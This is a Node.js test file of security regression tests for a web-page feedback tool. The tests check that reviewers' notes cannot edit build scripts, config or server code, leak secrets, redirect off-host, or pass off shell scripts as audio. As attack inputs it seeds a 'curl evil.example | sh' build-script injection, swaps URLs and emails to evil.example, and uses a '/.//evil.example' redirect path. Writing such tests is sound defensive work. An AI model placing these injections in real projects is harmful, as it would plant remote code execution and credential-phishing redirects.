// What a remote reviewer (anyone holding a `share` key, or anyone who can post a
// note) must not be able to reach or cause. One test per finding of the
// pre-release security review; each would fail on the code before the fix.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { createServer, request } from 'node:http';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { seedEdit, tree, cli, cleanup, uniqueName } from './_seed.mjs';

const { createShareProxy, PREFIX, KEY_PARAM } = await import('../server/proxy.js');
const { editTarget } = await import('../server/apply.js');
const { sniffAudio } = await import('../server/voice.js');
const { acquireReviewServer } = await import('../server/dev-server.js');

const dirs = [];
after(() => cleanup(...dirs));
const src = (files) => { const d = tree(files); dirs.push(d); return d; };
const listen = (server) => new Promise((r) => server.listen(0, '127.0.0.1', () => r(server.address().port)));

test('apply never edits config, scripts, CI or dotfiles, even when FROM matches there', async () => {
  const name = uniqueName('offlimits');
  const pkg = '{\n  "scripts": { "build": "vite build" }\n}\n';
  const dir = src({ 'package.json': pkg, 'scripts/deploy.sh': 'echo vite build\n', 'index.html': '<h1>Hello</h1>\n' });
  await seedEdit(name, { from: 'vite build', to: 'vite build && curl evil.example | sh' });
  const r = cli(['feedback', name, 'apply', '--src', dir, '--yes']);
  assert.match(r.out, /apply never edits/);
  assert.equal(readFileSync(join(dir, 'package.json'), 'utf8'), pkg);
  assert.equal(readFileSync(join(dir, 'scripts/deploy.sh'), 'utf8'), 'echo vite build\n');
});

test('apply never rewrites a code string or server code, from either kind of note', async () => {
  const name = uniqueName('codestr');
  const hero = 'export const API = "https://api.example.com/v1";\nexport const Hero = () => <h1>Pricing for everyone</h1>;\n';
  const route = 'export async function GET() { return Response.json({ message: "Pricing for everyone" }); }\n';
  const dir = src({ 'src/Hero.tsx': hero, 'src/app/api/route.ts': route });
  await seedEdit(name, { from: 'https://api.example.com/v1', to: 'https://evil.example/v1' });
  const r = cli(['feedback', name, 'apply', '--src', dir, '--yes']);
  assert.match(r.out, /held: it changes/);
  assert.equal(readFileSync(join(dir, 'src/Hero.tsx'), 'utf8'), hero);
  // Copy in JSX still applies; the same words in an API route are never a target.
  const name2 = uniqueName('jsxcopy');
  await seedEdit(name2, { from: 'Pricing for everyone', to: 'Pricing for every team' });
  assert.equal(cli(['feedback', name2, 'apply', '--src', dir, '--yes']).code, 0);
  assert.match(readFileSync(join(dir, 'src/Hero.tsx'), 'utf8'), /Pricing for every team/);
  assert.equal(readFileSync(join(dir, 'src/app/api/route.ts'), 'utf8'), route);
});

test('HTML: links, inline scripts and URLs in copy are held for a person; plain text applies', async () => {
  const page = '<a href="https://good.example/login">Log in</a>\n<script>fetch("https://good.example/api")</script>\n<p>Write to support@good.example today</p>\n<h1>Pricing for everyone</h1>\n';
  const dir = src({ 'index.html': page });
  for (const [from, to] of [['https://good.example/login', 'https://evil.example/login'], ['https://good.example/api', 'https://evil.example/api'], ['support@good.example', 'help@evil.example']]) {
    const name = uniqueName('held');
    const note = await seedEdit(name, { from, to });
    assert.match(cli(['feedback', name, 'apply', '--src', dir, '--yes']).out, /held: it changes/, from);
    assert.equal(readFileSync(join(dir, 'index.html'), 'utf8'), page, from);
    if (from.startsWith('support')) { // a person okays this one by id
      const ok = cli(['feedback', name, 'apply', '--src', dir, '--yes', '--include-code', note.id]);
      assert.match(ok.out, /WARNING: changes a URL or email address/);
      assert.match(readFileSync(join(dir, 'index.html'), 'utf8'), /help@evil\.example/);
    }
  }
  const name = uniqueName('plain');
  await seedEdit(name, { from: 'Pricing for everyone', to: 'Pricing for every team' });
  cli(['feedback', name, 'apply', '--src', dir, '--yes']);
  assert.match(readFileSync(join(dir, 'index.html'), 'utf8'), /Pricing for every team/);
});

test('editTarget: page copy files yes, tooling no', () => {
  for (const f of ['index.html', 'src/App.tsx', 'content/post.md', 'locales/en.json', 'src/data/plans.yaml', 'src/Pricing.vue']) assert.ok(editTarget(f), f);
  for (const f of ['package.json', 'vite.config.ts', 'tsconfig.app.json', 'scripts/x.js', 'bin/cli.js', '.github/workflows/ci.yml',
    'docker-compose.yml', 'pnpm-workspace.yaml', 'Dockerfile', 'Makefile', 'deploy.sh', '.env', 'src/.private/a.html', 'pyproject.toml',
    'src/app/api/route.ts', 'middleware.ts', 'src/hooks.server.ts', 'src/server/db.ts', 'env.ts', 'src/routes/+server.ts',
    'serverless.yml', 'render.yaml', 'app.json', 'src/settings.json']) assert.ok(!editTarget(f), f);
  for (const f of ['src/i18n/fr-CA.yml', 'en.json', 'src/scripts/menu.ts']) assert.ok(editTarget(f), f);
});

test('share: no local paths, no code strings, no raw copy map; one-slash redirect', async (t) => {
  const PLANTED = 'not-a-real-token-but-private-7f3a9c'; // shaped like no real provider's key, so secret scanners leave it alone
  const dir = src({
    'index.html': '<h1>Start free trial</h1><script src="/app.js"></script>\n',
    'app.js': `const API_TOKEN = "${PLANTED}";\nexport const cta = "Start free trial";\n`,
    'server/routes.js': `export const key = "${PLANTED}";\n`,
  });
  const upstream = createServer((req, res) => { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end('<!doctype html><html><head></head><body><h1>Start free trial</h1></body></html>'); });
  const up = await listen(upstream);
  const KEY = 'hardening-key-0123456789';
  const { server, close } = createShareProxy({ target: `http://127.0.0.1:${up}`, name: uniqueName('share-hard'), key: KEY, src: dir });
  const px = await listen(server);
  t.after(async () => { close(); server.closeAllConnections(); upstream.closeAllConnections(); await new Promise((r) => server.close(r)); await new Promise((r) => upstream.close(r)); });
  const base = `http://127.0.0.1:${px}`;
  const cookie = { Cookie: `agk_key=${encodeURIComponent(KEY)}` };

  const status = await (await fetch(`${base}${PREFIX}/`, { headers: cookie })).json();
  assert.equal(status.ok, true);
  assert.equal(status.store, undefined);
  assert.equal(status.bundle, undefined);
  assert.ok(!JSON.stringify(status).includes(dir));

  assert.equal((await fetch(`${base}${PREFIX}/__ag/copy-map`, { headers: cookie })).status, 404);

  // An outline naming no scripts widens the scope to the whole project: still no code strings.
  const outline = { url: `${base}/`, title: 't', items: [], resources: [] };
  for (const path of ['/__ag/copy-map', '/__ag/copy-map/snapshot']) {
    const res = await fetch(`${base}${PREFIX}${path}`, { method: 'POST', headers: { ...cookie, 'Content-Type': 'application/json' }, body: JSON.stringify(path.endsWith('snapshot') ? { outline } : outline) });
    assert.equal(res.status, 200, path);
    let body = await res.json();
    if (body.id) body = (await (await fetch(`${base}${PREFIX}/__ag/copy-map/snapshot?id=${body.id}`, { headers: cookie })).json()).placed;
    const text = JSON.stringify(body);
    assert.ok(!text.includes(PLANTED), `${path} leaked a code string`);
    assert.ok(!text.includes(dir), `${path} leaked the source path`);
    assert.deepEqual(body.code, []);
    assert.ok(text.includes('Start free trial'), `${path} should still carry the page copy`);
  }

  // The placement check is not an oracle: a unit the page made up (guessing a
  // secret's first letters) gets the same answer as any other refusal.
  const check = async (raw) => (await (await fetch(`${base}${PREFIX}/__ag/copy-map/check`, { method: 'POST', headers: { ...cookie, 'Content-Type': 'application/json' },
    body: JSON.stringify({ edits: [{ unit: { id: 'x', file: 'server/routes.js', raw, start: 20, end: 20 + raw.length, kind: 'string', quote: '"' }, to: 'y' }] }) })).json()).results[0];
  const guesses = await Promise.all([PLANTED.slice(0, 9), 'not-a-reX', PLANTED].map(check));
  assert.ok(guesses.every((g) => g.status === 'cant'), JSON.stringify(guesses));
  assert.equal(new Set(guesses.map((g) => g.reason)).size, 1, 'every made-up unit gets the same answer');

  // Only the toolbar's own keys are listed.
  const kv = await (await fetch(`${base}${PREFIX}/__kv?prefix=`, { headers: cookie })).json();
  assert.ok(JSON.stringify(kv).indexOf('agent-work') === -1);

  // `/.//evil.com/x` normalises to `//evil.com/x`: the redirect must stay on this host.
  const location = await new Promise((resolve, reject) => {
    request({ host: '127.0.0.1', port: px, path: `/.//evil.example/x?${KEY_PARAM}=${KEY}` }, (res) => { res.resume(); resolve(res.headers.location); }).on('error', reject).end();
  });
  assert.ok(location.startsWith('/') && !location.startsWith('//'), location);
});

test('Next.js plugin mode trusts the first localhost page only', async (t) => {
  const probe = createServer();
  const port = await listen(probe); // a free port: take one, then give it back
  await new Promise((r) => probe.close(r));
  const quiet = { info() {}, warn() {}, log() {} };
  const h = await acquireReviewServer({ name: uniqueName('loop'), port, loopback: true, log: quiet });
  t.after(() => h.release());
  const knock = (origin) => fetch(`${h.base}/__ag/agent-work`, { headers: { Origin: origin } }).then((r) => r.status);
  assert.notEqual(await knock('http://localhost:3000'), 403);
  assert.equal(await knock('http://localhost:3001'), 403);
  assert.equal(await knock('http://127.0.0.1:4000'), 403);
});

test('voice uploads must be real audio containers', () => {
  assert.ok(sniffAudio(readFileSync(new URL('./fixtures/voice-feedback.wav', import.meta.url)).subarray(0, 16)));
  assert.ok(sniffAudio(Uint8Array.from([0x1a, 0x45, 0xdf, 0xa3, 0, 0, 0, 0])));
  assert.ok(!sniffAudio(new TextEncoder().encode('#!/bin/sh\necho owned\n')));
  assert.ok(!sniffAudio(new Uint8Array(16)));
});

test('the copy classifier stays linear on long, odd strings (CodeQL js/redos)', async () => {
  const { classify } = await import('../server/copy-map.js');
  for (const x of ['.a' + ' a'.repeat(5000) + '!', '.' + 'a-'.repeat(5000) + '!', 'x: y;' + ' '.repeat(5000) + '!', '.a' + 'a'.repeat(40) + '!']) {
    const t = performance.now();
    classify({ text: x, kind: 'string' });
    assert.ok(performance.now() - t < 200, `${x.slice(0, 12)}… took ${Math.round(performance.now() - t)} ms`);
  }
  for (const sel of ['.btn-primary', '.nav > a.active', '#hero .title:hover', '[data-state=open] .x']) assert.equal(classify({ text: sel, kind: 'string' }).copy, 'no', sel);
});

test('share checks TLS for any upstream that is not this machine', async () => {
  const { readFileSync: read } = await import('node:fs');
  const src = read(new URL('../server/proxy.js', import.meta.url), 'utf8');
  assert.ok(!/rejectUnauthorized:\s*false/.test(src), 'no unconditional rejectUnauthorized: false');
});
